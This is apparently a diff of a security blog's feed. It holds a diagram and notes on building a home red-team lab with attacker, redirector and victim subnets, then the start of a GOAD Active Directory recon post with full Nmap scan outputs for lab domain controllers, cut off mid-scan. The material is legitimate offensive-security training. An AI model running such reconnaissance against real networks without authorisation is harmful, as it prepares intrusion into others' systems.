value=\&quot;\&quot; style=\&quot;verticalLabelPosition=bottom;sketch=0;html=1;fillColor=#A153A0;strokeColor=#ffffff;verticalAlign=top;align=center;points=[[0,0.5,0],[0.125,0.25,0],[0.25,0,0],[0.5,0,0],[0.75,0,0],[0.875,0.25,0],[1,0.5,0],[0.875,0.75,0],[0.75,1,0],[0.5,1,0],[0.125,0.75,0]];pointerEvents=1;shape=mxgraph.cisco_safe.compositeIcon;bgIcon=mxgraph.cisco_safe.design.blank_device;resIcon=mxgraph.cisco_safe.design.ms_active_directory;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;604.13\&quot; y=\&quot;320\&quot; width=\&quot;100\&quot; height=\&quot;90\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-4\&quot; value=\&quot;\&quot; style=\&quot;verticalLabelPosition=bottom;sketch=0;html=1;fillColor=#A153A0;strokeColor=#ffffff;verticalAlign=top;align=center;points=[[0,0.5,0],[0.125,0.25,0],[0.25,0,0],[0.5,0,0],[0.75,0,0],[0.875,0.25,0],[1,0.5,0],[0.875,0.75,0],[0.75,1,0],[0.5,1,0],[0.125,0.75,0]];pointerEvents=1;shape=mxgraph.cisco_safe.compositeIcon;bgIcon=mxgraph.cisco_safe.design.blank_device;resIcon=mxgraph.cisco_safe.design.ms_active_directory;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;604.13\&quot; y=\&quot;470\&quot; width=\&quot;100\&quot; height=\&quot;90\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-7\&quot; value=\&quot;\&quot; style=\&quot;points=[];aspect=fixed;html=1;align=center;shadow=0;dashed=0;fillColor=#FF6A00;strokeColor=none;shape=mxgraph.alibaba_cloud.aliyun_linux;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;324.13\&quot; y=\&quot;250\&quot; width=\&quot;72.5\&quot; height=\&quot;72.5\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-8\&quot; value=\&quot;\&quot; style=\&quot;image;sketch=0;aspect=fixed;html=1;points=[];align=center;fontSize=12;image=img/lib/mscae/VM_Linux_Non_Azure.svg;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;84.13\&quot; y=\&quot;290\&quot; width=\&quot;71.74\&quot; height=\&quot;66\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-9\&quot; value=\&quot;\&quot; style=\&quot;image;sketch=0;aspect=fixed;html=1;points=[];align=center;fontSize=12;image=img/lib/mscae/VirtualMachineWindows.svg;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;84.13\&quot; y=\&quot;390\&quot; width=\&quot;71.74\&quot; height=\&quot;66\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-12\&quot; value=\&quot;\&quot; style=\&quot;points=[];aspect=fixed;html=1;align=center;shadow=0;dashed=0;fillColor=#FF6A00;strokeColor=none;shape=mxgraph.alibaba_cloud.aliyun_linux;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;325.13\&quot; y=\&quot;407.5\&quot; width=\&quot;72.5\&quot; height=\&quot;72.5\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-32\&quot; style=\&quot;edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=1;entryY=0.5;entryDx=0;entryDy=0;strokeWidth=3;strokeColor=#97D077;\&quot; edge=\&quot;1\&quot; parent=\&quot;1\&quot; source=\&quot;h3hSjAzG3KHHkQH4Dxe3-13\&quot; target=\&quot;h3hSjAzG3KHHkQH4Dxe3-14\&quot;&gt;&lt;mxGeometry relative=\&quot;1\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-13\&quot; value=\&quot;\&quot; style=\&quot;rounded=0;whiteSpace=wrap;html=1;fillColor=none;strokeColor=#f5ec00;strokeWidth=3;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;544.13\&quot; y=\&quot;135\&quot; width=\&quot;220\&quot; height=\&quot;480\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-14\&quot; value=\&quot;\&quot; style=\&quot;rounded=0;whiteSpace=wrap;html=1;fillColor=none;strokeColor=#00c7fc;strokeWidth=4;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;304.13\&quot; y=\&quot;200\&quot; width=\&quot;120\&quot; height=\&quot;350\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-31\&quot; style=\&quot;edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;strokeWidth=3;strokeColor=#FFB570;\&quot; edge=\&quot;1\&quot; parent=\&quot;1\&quot; source=\&quot;h3hSjAzG3KHHkQH4Dxe3-15\&quot; target=\&quot;h3hSjAzG3KHHkQH4Dxe3-14\&quot;&gt;&lt;mxGeometry relative=\&quot;1\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-15\&quot; value=\&quot;\&quot; style=\&quot;rounded=0;whiteSpace=wrap;html=1;fillColor=none;strokeColor=#FF9933;strokeWidth=3;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;60.00000000000001\&quot; y=\&quot;250\&quot; width=\&quot;120\&quot; height=\&quot;250\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-16\&quot; value=\&quot;Redirector -1\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;330.38\&quot; y=\&quot;330\&quot; width=\&quot;73.75\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-17\&quot; value=\&quot;Redirector -2\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;327.25\&quot; y=\&quot;490\&quot; width=\&quot;73.75\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-18\&quot; value=\&quot;Victim-Network-01\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;584.13\&quot; y=\&quot;260\&quot; width=\&quot;140\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-19\&quot; value=\&quot;Victim-Network-02&amp;lt;span style=&amp;quot;caret-color: rgba(0, 0, 0, 0); font-family: monospace; font-size: 0px; text-align: start; white-space: nowrap;&amp;quot;&amp;gt;%3CmxGraphModel%3E%3Croot%3E%3CmxCell%20id%3D%220%22%2F%3E%3CmxCell%20id%3D%221%22%20parent%3D%220%22%2F%3E%3CmxCell%20id%3D%222%22%20value%3D%22Victim-Network-01%22%20style%3D%22text%3Bhtml%3D1%3Balign%3Dcenter%3BverticalAlign%3Dmiddle%3BwhiteSpace%3Dwrap%3Brounded%3D0%3B%22%20vertex%3D%221%22%20parent%3D%221%22%3E%3CmxGeometry%20x%3D%22600%22%20y%3D%22170%22%20width%3D%22140%22%20height%3D%2230%22%20as%3D%22geometry%22%2F%3E%3C%2FmxCell%3E%3C%2Froot%3E%3C%2FmxGraphModel%3E&amp;lt;/span&amp;gt;\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;584.13\&quot; y=\&quot;407.5\&quot; width=\&quot;140\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-20\&quot; value=\&quot;Victim-Network-03\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;584.13\&quot; y=\&quot;560\&quot; width=\&quot;140\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-21\&quot; value=\&quot;172.16.100.0/24\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;594.13\&quot; y=\&quot;280\&quot; width=\&quot;120\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-23\&quot; value=\&quot;172.16.110.0/24\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;594.13\&quot; y=\&quot;428.75\&quot; width=\&quot;120\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-24\&quot; value=\&quot;172.16.120.0/24\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;594.13\&quot; y=\&quot;580\&quot; width=\&quot;120\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-25\&quot; value=\&quot;172.16.50.0/24\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;300.38\&quot; y=\&quot;550\&quot; width=\&quot;120\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-26\&quot; value=\&quot;172.16.10.0/24\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;60.00000000000001\&quot; y=\&quot;500\&quot; width=\&quot;120\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-27\&quot; value=\&quot;Attacker-Network\&quot; style=\&quot;text;align=center;verticalAlign=middle;rounded=0;fontStyle=1;fontSize=13;html=1;fontColor=#CCCCCC;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;50.00000000000001\&quot; y=\&quot;200\&quot; width=\&quot;140\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-28\&quot; value=\&quot;Public Cloud Services\&quot; style=\&quot;text;align=center;verticalAlign=middle;rounded=0;fontStyle=1;fontSize=13;html=1;fontColor=#CCCCCC;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;297.26\&quot; y=\&quot;160\&quot; width=\&quot;133.75\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-29\&quot; value=\&quot;Complete Victim Network\&quot; style=\&quot;text;align=center;verticalAlign=middle;rounded=0;fontStyle=1;fontSize=13;html=1;fontColor=#CCCCCC;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;554.13\&quot; y=\&quot;110\&quot; width=\&quot;200\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-33\&quot; value=\&quot;SSH\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;fontStyle=1;fontSize=14;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;194.13\&quot; y=\&quot;380\&quot; width=\&quot;60\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-34\&quot; value=\&quot;HTTPS\&quot; style=\&quot;text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;fontStyle=1;fontSize=14;fontColor=#D1D1D1;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;449.13\&quot; y=\&quot;380\&quot; width=\&quot;70\&quot; height=\&quot;30\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;mxCell id=\&quot;h3hSjAzG3KHHkQH4Dxe3-35\&quot; value=\&quot;\&quot; style=\&quot;rounded=1;whiteSpace=wrap;html=1;fillColor=none;strokeWidth=3;glass=0;strokeColor=#EDEDED;\&quot; vertex=\&quot;1\&quot; parent=\&quot;1\&quot;&gt;&lt;mxGeometry x=\&quot;24\&quot; y=\&quot;70\&quot; width=\&quot;780\&quot; height=\&quot;590\&quot; as=\&quot;geometry\&quot;/&gt;&lt;/mxCell&gt;&lt;/root&gt;&lt;/mxGraphModel&gt;&lt;/diagram&gt;&lt;/mxfile&gt;&quot;,&quot;toolbar&quot;:&quot;pages zoom layers lightbox&quot;,&quot;page&quot;:0}"></div>
+    <script type="text/javascript" src="https://app.diagrams.net/js/viewer-static.min.js"></script>
+  </body></html>
+<p><br /></p>
+
+<p>Here the networking can be as simple as above or it can go as complex as possible depending on your imagination how you wanted to create the whole environment.</p>
+
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">Attacker Network</code> -&gt; <code class="language-plaintext highlighter-rouge">172.16.10.0/24</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Public Cloud Services</code> -&gt; <code class="language-plaintext highlighter-rouge">172.16.50.0/24</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Complete Victim Network</code> -&gt; <code class="language-plaintext highlighter-rouge">172.16.100.0/24</code>, <code class="language-plaintext highlighter-rouge">172.16.110.0/24</code>, <code class="language-plaintext highlighter-rouge">172.16.120.0/24</code></li>
+</ol>
+
+<p>The reason behind using multiple Victim networks is to have multiple environments in the LAB where there is some consistency can be seen, when ever you wanted to deploy new labs and stuff like that. In my case I’ve couple of Labs set in the victim network.</p>
+
+<ol>
+  <li>GOAD [The Game Of Active Directory]</li>
+  <li>SCCM / MECM LAB</li>
+</ol>
+
+<p>Both the labs are build by <code class="language-plaintext highlighter-rouge"># Orange Cyberdefense</code>. So, from the above structure, I’ve my Victim network as follows.</p>
+
+<ol>
+  <li>GOAD -&gt; <code class="language-plaintext highlighter-rouge">172.16.100.0/24</code></li>
+  <li>SCCM -&gt; <code class="language-plaintext highlighter-rouge">172.16.110.0/24</code></li>
+</ol>
+
+<blockquote class="notice--info">
+  <p>So now the question is how to setup this using <code class="language-plaintext highlighter-rouge">pfsense</code>?</p>
+</blockquote>
+
+<p>The above networking is achieved by setting up multiple V-LANS in <code class="language-plaintext highlighter-rouge">PFSense</code> firewall and adding firewall rules. Also, will be covering the networking part of the story using <code class="language-plaintext highlighter-rouge">PFSense</code>. The story kept for some other day.</p>
+
+<h3 id="stay-tuned-for-the-upcoming-blog">Stay tuned for the upcoming blog!!</h3>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="Red-Team" /><category term="HomeLab" /><category term="IT" /><category term="RED-Team" /><summary type="html"><![CDATA[How to Setup a Red-Teams infrastructure at Home]]></summary></entry><entry><title type="html">Game of Active Directory - Part 2 [Recon]</title><link href="http://localhost:4000/goad/GOAD-p2/" rel="alternate" type="text/html" title="Game of Active Directory - Part 2 [Recon]" /><published>2024-12-07T00:00:00+05:30</published><updated>2024-12-07T00:00:00+05:30</updated><id>http://localhost:4000/goad/GOAD-p2</id><content type="html" xml:base="http://localhost:4000/goad/GOAD-p2/"><![CDATA[<h2 id="enumerate-network">Enumerate Network</h2>
+<p>We’ll start enumerating the network</p>
+<h3 id="nmap-scanning-the-whole-ad-range">Nmap Scanning the whole AD range</h3>
+
+<h3 id="list-of-ips-assigned-to-vms">list of IPs assigned to VMs</h3>
+
+<p>IP address assigned / configured to each machine/s at the time of LAB deployment.</p>
+<ol>
+  <li>172.16.100.50 - DC-01 <code class="language-plaintext highlighter-rouge">kingslanding.sevenkingdoms.local</code></li>
+  <li>172.16.100.51 - DC-02 <code class="language-plaintext highlighter-rouge">winterfell.north.sevenkingdoms.local</code></li>
+  <li>172.16.100.52 -DC-03 <code class="language-plaintext highlighter-rouge">meereen.essos.local</code></li>
+  <li>172.16.100.22 -SRVC-02 <code class="language-plaintext highlighter-rouge">castelblack.north.sevenkingdoms.local</code></li>
+  <li>172.16.100.23 -SRVC-03 <code class="language-plaintext highlighter-rouge">braavos.essos.local</code></li>
+</ol>
+
+<p><img src="/assets/images/sample/GOAD/SCR-20241208-pnsv.png" alt="SCR-20241208-pnsv.png" /></p>
+
+<h4 id="scan-results-from-kingslandingsevenkingdomslocal-1721610050">Scan results from <code class="language-plaintext highlighter-rouge">kingslanding.sevenkingdoms.local</code> [172.16.100.50]</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-02 07:50 EST
+Nmap scan report for 172.16.100.50
+Host is up (0.0010s latency).
+Not shown: 987 closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-title: IIS Windows Server
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-02 17:20:32Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:kingslanding.sevenkingdoms.local
+| Not valid before: 2024-10-28T15:04:14
+|_Not valid after:  2025-10-28T15:04:14
+|_ssl-date: 2024-12-02T17:21:21+00:00; +4h29m58s from scanner time.
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:kingslanding.sevenkingdoms.local
+| Not valid before: 2024-10-28T15:04:14
+|_Not valid after:  2025-10-28T15:04:14
+|_ssl-date: 2024-12-02T17:21:21+00:00; +4h29m58s from scanner time.
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:kingslanding.sevenkingdoms.local
+| Not valid before: 2024-10-28T15:04:14
+|_Not valid after:  2025-10-28T15:04:14
+|_ssl-date: 2024-12-02T17:21:21+00:00; +4h29m58s from scanner time.
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
+|_ssl-date: 2024-12-02T17:21:21+00:00; +4h29m58s from scanner time.
+| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:kingslanding.sevenkingdoms.local
+| Not valid before: 2024-10-28T15:04:14
+|_Not valid after:  2025-10-28T15:04:14
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: SEVENKINGDOMS
+|   NetBIOS_Domain_Name: SEVENKINGDOMS
+|   NetBIOS_Computer_Name: KINGSLANDING
+|   DNS_Domain_Name: sevenkingdoms.local
+|   DNS_Computer_Name: kingslanding.sevenkingdoms.local
+|   DNS_Tree_Name: sevenkingdoms.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2024-12-02T17:21:11+00:00
+| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local
+| Not valid before: 2024-10-27T13:04:51
+|_Not valid after:  2025-04-28T13:04:51
+|_ssl-date: 2024-12-02T17:21:21+00:00; +4h29m58s from scanner time.
+MAC Address: BC:24:11:7B:95:CB (Unknown)
+Device type: general purpose
+Running: Microsoft Windows 2019
+OS details: Microsoft Windows Server 2019
+Network Distance: 1 hop
+Service Info: Host: KINGSLANDING; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2024-12-02T17:21:12
+|_  start_date: N/A
+|_clock-skew: mean: 4h29m58s, deviation: 0s, median: 4h29m57s
+|_nbstat: NetBIOS name: KINGSLANDING, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: bc:24:11:7b:95:cb (unknown)
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   1.02 ms 172.16.100.50
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 58.82 seconds
+</code></pre></div></div>
+
+<h4 id="scan-results-from-winterfellnorthsevenkingdomslocal-1721610051">Scan results from <code class="language-plaintext highlighter-rouge">winterfell.north.sevenkingdoms.local</code> [172.16.100.51]</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-08 05:27 EST
+Nmap scan report for 172.16.100.51
+Host is up (0.00052s latency).
+Not shown: 988 closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-08 14:57:24Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:winterfell.north.sevenkingdoms.local
+| Not valid before: 2024-11-17T23:42:37
+|_Not valid after:  2025-11-17T23:42:37
+|_ssl-date: 2024-12-08T14:58:13+00:00; +4h29m59s from scanner time.
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:winterfell.north.sevenkingdoms.local
+| Not valid before: 2024-11-17T23:42:37
+|_Not valid after:  2025-11-17T23:42:37
+|_ssl-date: 2024-12-08T14:58:13+00:00; +4h29m59s from scanner time.
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
+|_ssl-date: 2024-12-08T14:58:13+00:00; +4h29m59s from scanner time.
+| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:winterfell.north.sevenkingdoms.local
+| Not valid before: 2024-11-17T23:42:37
+|_Not valid after:  2025-11-17T23:42:37
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
+|_ssl-date: 2024-12-08T14:58:13+00:00; +4h29m59s from scanner time.
+| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:winterfell.north.sevenkingdoms.local
+| Not valid before: 2024-11-17T23:42:37
+|_Not valid after:  2025-11-17T23:42:37
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
+| Not valid before: 2024-10-27T13:29:25
+|_Not valid after:  2025-04-28T13:29:25
+| rdp-ntlm-info: 
+|   Target_Name: NORTH
+|   NetBIOS_Domain_Name: NORTH
+|   NetBIOS_Computer_Name: WINTERFELL
+|   DNS_Domain_Name: north.sevenkingdoms.local
+|   DNS_Computer_Name: winterfell.north.sevenkingdoms.local
+|   DNS_Tree_Name: sevenkingdoms.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2024-12-08T14:58:03+00:00
+|_ssl-date: 2024-12-08T14:58:13+00:00; +4h29m59s from scanner time.
+MAC Address: BC:24:11:35:B3:38 (Unknown)
+Device type: general purpose
+Running: Microsoft Windows 2019
+OS details: Microsoft Windows Server 2019
+Network Distance: 1 hop
+Service Info: Host: WINTERFELL; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-12-08T14:58:04
+|_  start_date: N/A
+|_nbstat: NetBIOS name: WINTERFELL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: bc:24:11:35:b3:38 (unknown)
+|_clock-skew: mean: 4h29m59s, deviation: 0s, median: 4h29m58s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.52 ms 172.16.100.51
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 57.59 seconds
+</code></pre></div></div>
+
+<h4 id="scan-results-from-meereenessoslocal-1721610052">Scan results from <code class="language-plaintext highlighter-rouge">meereen.essos.local</code> [172.16.100.52]</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-08 05:35 EST
+Nmap scan report for 172.16.100.52
+Host is up (0.00059s latency).
+Not shown: 988 closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-08 15:05:54Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: essos.local, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=meereen.essos.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:meereen.essos.local
+| Not valid before: 2024-10-28T15:04:35
+|_Not valid after:  2025-10-28T15:04:35
